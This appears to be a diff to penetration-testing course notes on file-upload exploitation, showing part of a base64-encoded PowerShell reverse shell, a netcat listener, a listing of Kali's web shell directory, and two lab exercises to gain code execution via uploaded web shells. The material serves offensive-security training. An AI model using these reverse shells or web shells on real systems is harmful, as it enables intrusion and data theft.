@@ -79,7 +79,7 @@ Using curl to send the base64 encoded reverse shell oneliner
 >AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 >```
 
-Using curl to send the base64 encoded reverse shell oneliner
+Incoming reverse shell
 >``` shell
 >kali@kali:~$ nc -nvlp 4444
 >
@@ -106,5 +106,32 @@ Using curl to send the base64 encoded reverse shell oneliner
 ># =====================================
 >```
 
+Listing of the webshells directory on Kali
+>``` shell
+>kali@kali:~$ ls -la /usr/share/webshells
+>
+># ========== Expected Result ==========
+>total 40
+>drwxr-xr-x   8 root root  4096 Feb 11 02:00 .
+>drwxr-xr-x 320 root root 12288 Apr 19 09:17 ..
+>drwxr-xr-x   2 root root  4096 Feb 11 01:58 asp
+>drwxr-xr-x   2 root root  4096 Apr 25 07:25 aspx
+>drwxr-xr-x   2 root root  4096 Feb 11 01:58 cfm
+>drwxr-xr-x   2 root root  4096 Apr 25 07:06 jsp
+>lrwxrwxrwx   1 root root    19 Feb 11 02:00 laudanum -> /usr/share/laudanum
+>drwxr-xr-x   2 root root  4096 Feb 11 01:58 perl
+>drwxr-xr-x   3 root root  4096 Feb 11 01:58 php
+># =====================================
+>```
 
+Lab 1 - Follow the steps above on VM #1 and exploit the file upload vulnerability. The flag is located in the C:\xampp\passwords.txt file as a password for the mountainadmin user.
+>``` shell
+>
+>```
+>
 
+Lab 2 - The target VM #2 is running an instance of TinyFileManager. Disable Burp before you start to avoid issues with the web application. Log in to the web application at http://192.168.50.16/index.php with the user admin and password admin@123. Find a way to get code execution by using an uploaded web shell. Display the contents of the /opt/install.txt file to get the flag.
+>``` shell
+>
+>```
+>
